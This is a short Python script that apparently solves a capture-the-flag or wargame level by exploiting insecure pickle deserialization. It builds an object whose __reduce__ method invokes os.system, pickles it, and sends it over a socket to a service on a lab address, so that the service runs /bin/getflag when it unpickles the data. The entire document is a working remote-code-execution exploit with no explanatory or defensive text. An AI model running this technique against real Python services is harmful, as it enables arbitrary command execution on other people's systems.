import socket, pickle, os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('/bin/getflag > /tmp/17.txt', ))

HOST = '192.168.56.101'
PORT = 10007
# Create a socket connection.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
reply = s.recv(1024)
print (HOST +": " + reply)

data_string = pickle.dumps(EvilPickle())
print ("Sending...")
s.send(data_string)
print ("Awaiting reply from "+ HOST + "...")
reply = s.recv(1024)
print (HOST +": " + reply)
